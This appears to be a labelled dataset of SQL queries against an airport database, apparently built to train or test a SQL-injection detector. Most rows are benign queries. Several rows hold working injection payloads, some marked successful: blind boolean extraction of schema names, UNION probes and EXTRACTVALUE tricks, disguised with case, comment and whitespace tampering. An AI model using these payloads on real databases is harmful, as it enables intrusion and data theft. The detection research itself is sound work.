full_query,label,user_inputs,attack_stage,tamper_method,attack_status,statement_type,query_template_id,attack_id,attack_technique,split
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('JP-2339','FR-0780','76AR','TS44');",0,JP-2339 FR-0780 76AR TS44,,,,update,airport-U10,,,train
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""CL""  AND  8717=( SELECT   (   CASE     WHEN  (  ORD(    MID(( SELECT     IFNULL(  CAST( column_name      AS   NCHAR  ),0x20)    FROM    INFORMATION_SCHEMA.   COLUMNS        WHERE      table_name  =0x6e617661696473  AND  table_schema=0x64617461736574    LIMIT    14,1),5,1))>101)  THEN   8717  ELSE   ( SELECT   6030  UNION     SELECT   5305)    END    ))-- -""",1," CL   AND  8717=( SELECT   (   CASE     WHEN  (  ORD(    MID(( SELECT     IFNULL(  CAST( column_name      AS   NCHAR  ),0x20)    FROM    INFORMATION_SCHEMA.   COLUMNS        WHERE      table_name  =0x6e617661696473  AND  table_schema=0x64617461736574    LIMIT    14,1),5,1))>101)  THEN   8717  ELSE   ( SELECT   6030  UNION     SELECT   5305)    END    ))-- - ",exploit,multiplespaces,success,select,airport-S9,boolean-204,boolean,test
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""SDD6"",""small_airport"", ""-1927     UNION     ALL       SELECT   4373,4373,4373,4373,4373,4373,4373,4373#"",""https://en.wikipedia.org/wiki/King_Island_Airport"",""AS"")",1," SDD6 small_airport -1927     UNION     ALL       SELECT   4373,4373,4373,4373,4373,4373,4373,4373# https://en.wikipedia.org/wiki/King_Island_Airport AS ",recon,multiplespaces,failure,insert,airport-I3,union-14,union,test
"DELETE FROM airport WHERE name LIKE ""Mendig Airfield"" OR keywords LIKE ""Hahaia"";  ",0,Mendig Airfield Hahaia,,,,delete,airport-D3,,,test
"SELECT * FROM airport WHERE continent = ""AS"" AND iso_region LIKE ""BR-MT""",0,AS BR-MT,,,,select,airport-S8,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Hackley Hospital Emergency Heliport""",0,Hackley Hospital Emergency Heliport,,,,select,airport-S3,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 127.45 AND  119.3  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  127.7  AND  132.3  ORDER BY frequency;",0,127.45 119.3 127.7 132.3,,,,select,airport-S13,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""SJCM"") OR name LIKE ""Seacloud Hotel, Hotel Seacloud""",0,"SJCM Seacloud Hotel, Hotel Seacloud",,,,select,airport-S10,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""Paniai"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Sikasso Region"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Aeropuertos de Perú"", ""%"");",0,Paniai Airports in Sikasso Region Aeropuertos de Perú,,,,select,airport-S18,,,test
"DELETE FROM airport WHERE ident=""35AK"";",0,35AK,,,,delete,airport-D1,,,train
"SELECT id, ident, name FROM airport WHERE iso_country = ""CA""",0,CA,,,,select,airport-S6,,,test
"DELETE FROM countries WHERE code = ""CD"";",0,CD,,,,delete,airport-D7,,,test
"INSERT INTO countries (code, name, continent) VALUES (""KW"", ""São Tomé and Principe"", ""AF"")",0,KW São Tomé and Principe AF,,,,insert,airport-I7,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Jindal Heliport"" and 1207=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 4,1),9,1))>84) then 1207 else (select 4520 union select 4098) end))-- -""",1," Jindal Heliport  and 1207=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 4,1),9,1))>84) then 1207 else (select 4520 union select 4098) end))-- - ",exploit,lowercase,success,select,airport-S3,boolean-168,boolean,test
"INSERT INTO countries (code, name, continent) VALUES (""CY"", ""Palau"", ""EU"")",0,CY Palau EU,,,,insert,airport-I7,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""KI"" GROUP BY r.name ORDER BY r.name ASC;",0,KI,,,,select,airport-S5,,,train
"UPDATE airport SET wikipedia_link = ""https://pl.wikipedia.org/wiki/Aeroklub_Bydgoski"" WHERE ident = ""MX-1628""",0,https://pl.wikipedia.org/wiki/Aeroklub_Bydgoski MX-1628,,,,update,airport-U3,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""SVKV"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""WI40"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""Brindisi Papola Casale Airport, Brindisi Salento Airport, Brindisi Casale Antonio Papolo Airport, Salento Airport"", ""%"");",0,"SVKV WI40 Brindisi Papola Casale Airport, Brindisi Salento Airport, Brindisi Casale Antonio Papolo Airport, Salento Airport",,,,select,airport-S17,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""UKLU"";",0,UKLU,,,,select,airport-S7,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""BG"" GROUP BY r.name ORDER BY r.name ASC;",0,BG,,,,select,airport-S5,,,test
"DELETE FROM regions WHERE name = ""Montevideo Department"";",0,Montevideo Department,,,,delete,airport-D8,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Orson Field"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Orson Field,,,,select,airport-S14,,,test
"UPDATE airport SET name = ""Yaizu Heliport"" WHERE ident = ""CYFB""",0,Yaizu Heliport CYFB,,,,update,airport-U1,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""US-7452"")) as BcjN where 6425=6425 and 3533=5134-- -"", ""small_airport"", ""REC Berrini Helipad"", -5.833000183105469, -57.041631, 2625.0)",1," US-7452""   as BcjN where 6425=6425 and 3533=5134-- - small_airport REC Berrini Helipad -5.833000183105469 -57.041631 2625.0 ",recon,lowercase,failure,insert,airport-I2,boolean-6,boolean,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""LT"" GROUP BY r.name ORDER BY r.name ASC;",0,LT,,,,select,airport-S5,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('AK10','SDZD','MX-1092','FEFY');",0,AK10 SDZD MX-1092 FEFY,,,,update,airport-U10,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""SZ"" OR c.name LIKE CONCAT(""%"", ""Bulgaria"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 2 ORDER BY navaid_count DESC;",0,SZ Bulgaria 2,,,,select,airport-S20,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Hanger ABC Heliport""",0,Hanger ABC Heliport,,,,select,airport-S3,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""GY"" OR c.name LIKE CONCAT(""%"", ""Faroe Islands"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 3 ORDER BY navaid_count DESC;",0,GY Faroe Islands 3,,,,select,airport-S20,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""CO""",0,CO,,,,select,airport-S6,,,test
"DELETE FROM navaids WHERE ident = ""MAU"";",0,MAU,,,,delete,airport-D6,,,test
SHOW TABLES;,0,,,,,admin,airport-admin2,,,test
"INSERT INTO regions (code, local_code, name, continent, iso_country) VALUES (""GW-GA"", ""U-A"", ""Nuevo León"", ""SA"", ""PK"")",0,GW-GA U-A Nuevo León SA PK,,,,insert,airport-I5,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""RS""",0,RS,,,,select,airport-S6,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Ostrobothnia Region"";",0,Ostrobothnia Region,,,,select,airport-S15,,,test
"SELECT * FROM airport WHERE gps_code = ""EGTC"" OR local_code = ""CFB8""",0,EGTC CFB8,,,,select,airport-S4,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES ((select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x72756e77617973 and table_schema=0x64617461736574 limit 13,1),24,1))>101) then 23192 else (select 5363 union select 1032) end)), ""LKMO"", 2290.0, ""ASPH-P"", 1, 0)",1," (select (case when (ord(mid((select ifnull(cast(column_name as nchar ,0x20  from INFORMATION_SCHEMA.columns where table_name=0x72756e77617973 and table_schema=0x64617461736574 limit 13,1 ,24,1  >101  then 23192 else (select 5363 union select 1032  end   LKMO 2290.0 ASPH-P 1 0 ",exploit,lowercase,success,insert,airport-I9,boolean-48,boolean,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""JP-1995"";",0,JP-1995,,,,select,airport-S7,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Fafe heliport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Fafe heliport,,,,select,airport-S14,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Neff Field"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Neff Field,,,,select,airport-S14,,,test
"DELETE FROM runways WHERE airport_ident = ""17WI"";",0,17WI,,,,delete,airport-D5,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Alakanuk Airport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Alakanuk Airport,,,,select,airport-S14,,,test
"INSERT INTO countries (code, name, continent) VALUES (""SY"", ""-1217) OR ELT/**/(1889=1889,3971) AND (5566=5566"", ""AF"")",1," SY -1217) OR ELT/**/(1889=1889,3971) AND (5566=5566 AF ",recon,commentbeforeparentheses,success,insert,airport-I7,boolean-36,boolean,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Vencerámica Tejerías  Heliport""",0,Vencerámica Tejerías  Heliport,,,,select,airport-S3,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""ABW, ABW"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Ziri"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""DRC"", ""%"");",0,"ABW, ABW Airports in Ziri DRC",,,,select,airport-S18,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (89450, ""ODR"", ""Al Ain"", ""VOR-DME"", 345, ""US"")",0,89450 ODR Al Ain VOR-DME 345 US,,,,insert,airport-I10,,,test
"UPDATE airport SET name = ""Alaskan RV Park Airstrip"" WHERE ident = ""1U9""",0,Alaskan RV Park Airstrip 1U9,,,,update,airport-U1,,,test
SELECT * FROM airport WHERE icao_code = 'VGJR';,0,VGJR,,,,select,airport-S1,,,train
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""SJOM"") OR name LIKE ""Polonia International Airport, WIMM""",0,"SJOM Polonia International Airport, WIMM",,,,select,airport-S10,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""VE"" GROUP BY r.name ORDER BY r.name ASC;",0,VE,,,,select,airport-S16,,,test
"SELECT * FROM airport WHERE gps_code = ""SIQW"" OR local_code = ""7V9""",0,SIQW 7V9,,,,select,airport-S4,,,test
"DELETE FROM countries WHERE code = ""JE"";",0,JE,,,,delete,airport-D7,,,test
"DELETE FROM regions WHERE name = ""Sancti	SpíritusProvince	ORDER�BY
1---"";",1," Sancti	SpíritusProvince	ORDER�BY
1--- ",recon,space2mysqlblank,failure,delete,airport-D8,union-152,union,test
"UPDATE regions SET keywords = ""Airports in Zambezia Province"" where 9829=9829 and 7835=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x6e617661696473 and table_schema=0x64617461736574 limit 19,1),1,1))>97) then 7835 else (select 6231 union select 9403) end))-- -"" WHERE iso_country = ""LV"";",1," Airports in Zambezia Province"" where 9829=9829 and 7835=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x6e617661696473 and table_schema=0x64617461736574 limit 19,1),1,1))>97) then 7835 else (select 6231 union select 9403) end))-- - LV ",exploit,lowercase,success,update,airport-U9,boolean-102,boolean,test
"SELECT * FROM airport WHERE continent = ""SA"" AND iso_region LIKE ""KE-700""",0,SA KE-700,,,,select,airport-S8,,,test
"DELETE FROM airport WHERE name = ""SCE Energy Control Center Heliport"";  ",0,SCE Energy Control Center Heliport,,,,delete,airport-D2,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (89058, ""MN"", ""Formosa"", ""TACAN"", 412, ""PH"")",0,89058 MN Formosa TACAN 412 PH,,,,insert,airport-I10,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""MY"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 3 ORDER BY runway_count DESC, a.name ASC;",0,MY 3,,,,select,airport-S19,,,test
"DELETE FROM airport WHERE name LIKE ""Winters Helicopter Landing Paddock"" OR keywords LIKE ""SWFW"";  ",0,Winters Helicopter Landing Paddock SWFW,,,,delete,airport-D3,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""RU-0417"";",0,RU-0417,,,,select,airport-S7,,,test
"INSERT INTO regions (code, local_code, name, continent, iso_country) VALUES (""VE-D"", ""RP"", ""Gorj County"", ""EU"", ""SD"")",0,VE-D RP Gorj County EU SD,,,,insert,airport-I5,,,test
"UPDATE navaids SET name = ""Soroako"" WHERE ident = ""HFF"";",0,Soroako HFF,,,,update,airport-U7,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""RU"", ""Barbados"", ""EU"", ""Aeropuertos de Bolivia"")",0,RU Barbados EU Aeropuertos de Bolivia,,,,insert,airport-I6,,,train
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""10MS, 10MS"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Mozirje"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Île Bourbon, La Réunion"", ""%"");",0,"10MS, 10MS Airports in Mozirje Île Bourbon, La Réunion",,,,select,airport-S18,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""SPLO"", ""small_airport"", ""RAF Birch"", 35.68177, -85.492938, 1046.0)",0,SPLO small_airport RAF Birch 35.68177 -85.492938 1046.0,,,,insert,airport-I2,,,test
SELECT * FROM airport WHERE icao_code = 'KBED';,0,KBED,,,,select,airport-S1,,,test
"SELECT id FROM airports WHERE name LIKE ""%D3Xh3LriNa1GIF7euQlK%"" AND elevation_feet BETWEEN 561.0 AND 5799.0 AND iso_region LIKE ""US-FL"" AND scheduled_service = ""no"" AND latitude >= 38.393916",0,D3Xh3LriNa1GIF7euQlK 561.0 5799.0 US-FL no 38.393916,,,,select,airport-S23,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""C 504 Heliport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,C 504 Heliport,,,,select,airport-S14,,,train
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""LS"" GROUP BY r.name ORDER BY r.name ASC;",0,LS,,,,select,airport-S16,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('MO7') AND 8156 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x72756e77617973 AND table_schema LIKE 0x64617461736574 LIMIT 19,1),6,1))>112) THEN 8156 ELSE (SELECT 8914 UNION SELECT 4073) END))-- -','MO7') AND 8156 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x72756e77617973 AND table_schema LIKE 0x64617461736574 LIMIT 19,1),6,1))>112) THEN 8156 ELSE (SELECT 8914 UNION SELECT 4073) END))-- -','MO7') AND 8156 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x72756e77617973 AND table_schema LIKE 0x64617461736574 LIMIT 19,1),6,1))>112) THEN 8156 ELSE (SELECT 8914 UNION SELECT 4073) END))-- -','MO7') AND 8156 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x72756e77617973 AND table_schema LIKE 0x64617461736574 LIMIT 19,1),6,1))>112) THEN 8156 ELSE (SELECT 8914 UNION SELECT 4073) END))-- -');",1," MO7') AND 8156 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x72756e77617973 AND table_schema LIKE 0x64617461736574 LIMIT 19,1),6,1))>112) THEN 8156 ELSE (SELECT 8914 UNION SELECT 4073) END))-- - MO7') AND 8156 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x72756e77617973 AND table_schema LIKE 0x64617461736574 LIMIT 19,1),6,1))>112) THEN 8156 ELSE (SELECT 8914 UNION SELECT 4073) END))-- - MO7') AND 8156 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x72756e77617973 AND table_schema LIKE 0x64617461736574 LIMIT 19,1),6,1))>112) THEN 8156 ELSE (SELECT 8914 UNION SELECT 4073) END))-- - MO7') AND 8156 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x72756e77617973 AND table_schema LIKE 0x64617461736574 LIMIT 19,1),6,1))>112) THEN 8156 ELSE (SELECT 8914 UNION SELECT 4073) END))-- - ",exploit,equaltolike,success,update,airport-U10,boolean-108,boolean,test
"SELECT * FROM airport WHERE continent = ""AS"" AND iso_region LIKE ""ZA-NP""",0,AS ZA-NP,,,,select,airport-S8,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""RW"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 2 ORDER BY runway_count DESC, a.name ASC;",0,RW 2,,,,select,airport-S19,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Kremmling Memorial Hospital Heliport"" anD 2915=(seLeCt (CAse whEN (oRd(Mid((seLeCt ifnuLL(CaSt(ColUmN_Name aS nCHar),0x20) FrOM INFORMATION_SCHEMA.cOlumNs wHerE tabLe_NAme=0x72756e77617973 anD table_schema=0x64617461736574 LImit 15,1),6,1))>96) theN 2915 ELse (seLeCt 6058 UNiON seLeCt 8438) eNd))-- -"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",1," Kremmling Memorial Hospital Heliport"" anD 2915=(seLeCt (CAse whEN (oRd(Mid((seLeCt ifnuLL(CaSt(ColUmN_Name aS nCHar),0x20) FrOM INFORMATION_SCHEMA.cOlumNs wHerE tabLe_NAme=0x72756e77617973 anD table_schema=0x64617461736574 LImit 15,1),6,1))>96) theN 2915 ELse (seLeCt 6058 UNiON seLeCt 8438) eNd))-- - ",exploit,randomcase,success,select,airport-S14,boolean-228,boolean,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""24MI"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Andalucía"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Airports in Chad"", ""%"");",0,24MI Airports in Andalucía Airports in Chad,,,,select,airport-S18,,,test
"DELETE FROM runways WHERE airport_ident = ""IS80"";",0,IS80,,,,delete,airport-D5,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Cuanza Sul Province"";",0,Cuanza Sul Province,,,,select,airport-S15,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""BD""/**/AND/**/EXTRACTVALUE(3740,CASE/**/WHEN/**/(ORD(MID((SELECT/**/IFNULL(CAST(column_name/**/AS/**/NCHAR),0x20)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/table_name=0x72756e77617973/**/AND/**/table_schema=0x64617461736574/**/LIMIT/**/14,1),2,1))>96)/**/THEN/**/3740/**/ELSE/**/0x3A/**/END)/**/AND/**/""OXvG""=""OXvG"" OR c.name LIKE CONCAT(""%"", ""Serbia"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 2 ORDER BY navaid_count DESC;",1," BD""/**/AND/**/EXTRACTVALUE(3740,CASE/**/WHEN/**/(ORD(MID((SELECT/**/IFNULL(CAST(column_name/**/AS/**/NCHAR),0x20)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/table_name=0x72756e77617973/**/AND/**/table_schema=0x64617461736574/**/LIMIT/**/14,1),2,1))>96)/**/THEN/**/3740/**/ELSE/**/0x3A/**/END)/**/AND/**/""OXvG""=""OXvG Serbia 2 ",exploit,space2comment,success,select,airport-S20,boolean-252,boolean,test
"SELECT * FROM airport WHERE gps_code = ""96VA"" OR local_code = ""YPSR""",0,96VA YPSR,,,,select,airport-S4,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""ZZ"" OR c.name LIKE CONCAT(""%"", ""Hungary"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 3 ORDER BY navaid_count DESC;",0,ZZ Hungary 3,,,,select,airport-S20,,,test
"SELECT * FROM airport WHERE gps_code = ""CTU2"" OR local_code = ""ZEF""",0,CTU2 ZEF,,,,select,airport-S4,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""TH"" GROUP BY r.name ORDER BY r.name ASC;",0,TH,,,,select,airport-S5,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""South West Ethiopia Peoples' Region"";",0,South West Ethiopia Peoples' Region,,,,select,airport-S15,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 127.7 AND  120.7  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  122.8  AND  118.4  ORDER BY frequency;",0,127.7 120.7 122.8 118.4,,,,select,airport-S13,,,test
